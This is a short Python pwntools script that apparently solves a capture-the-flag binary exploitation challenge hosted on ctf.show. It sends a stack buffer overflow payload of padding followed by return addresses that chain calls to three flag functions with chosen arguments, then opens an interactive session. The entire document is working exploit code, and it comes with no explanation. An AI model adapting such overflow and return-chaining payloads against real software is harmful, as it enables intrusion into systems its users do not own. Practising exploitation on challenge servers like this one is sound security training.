import elftools.elf.sections
from pwn64 import *
p = remote("pwn.challenge.ctf.show",28301)
flag1 = 0x08048586
flag2 = 0x0804859D
flag = 0x08048606
payload = flat([b'a'*(0x2c+4),flag1,flag2,flag,-1397969748,-1111638595])
p.sendline(payload)
p.interactive()